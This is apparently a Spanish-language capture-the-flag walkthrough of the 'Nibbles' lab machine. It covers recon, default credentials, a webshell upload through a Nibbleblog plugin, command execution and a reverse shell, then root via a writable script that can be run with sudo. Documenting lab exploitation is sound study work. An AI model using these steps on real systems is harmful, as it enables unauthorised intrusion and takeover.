PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Descubrimos el Directorio /nibbleblog en el Código Fuente

-Nibbleblog es un CMS, el cual tiene una vulnerabilidad de **'Arbitrary File Upload'** en su **version 4.0.3**

-En la siguiente Ruta, confirmamos que tiene la versión 4.0:
	-http://10.10.10.75/nibbleblog/themes/echo/config.bit
		**'version'=>'4.0'**

-Para explotar el File Upload debemos estar autenticados

-En la siguiente ruta, descubrimos que existe el **usuario 'admin'**:
	-http://10.10.10.75/nibbleblog/content/private/users.xml

-Nos autenticamos en la ruta /nibbles/admin.php con las siguientes credenciales:
	-Username: admin
	-Password: nibbles

-Nos vamos a Plugins --> My Image --> Subimos una webshell

-Ejecutamos Comandos a través de la webshell ubicada en la siguiente ruta:
	-http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
		**uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)**

-Nos mandamos una RS y obtenemos acceso a la Máquina:
	**nibbler@Nibbles:/$ whoami**
		**nibbler**

## Escalada de Privilegios

-sudo -l:
	/home/nibbler/personal/stuff/monitor.sh

-Es un script en bash sobre el que tenemos permisos de Escritura, Lectura y Ejecucióna y que podemos Ejecutar como root

-Inyectamos una RS alfinal del script y obtenemos una shell como root:
	-sudo /home/nibbler/personal/stuff/monitor.sh
		**root@Nibbles:/# whoami**
			**root**

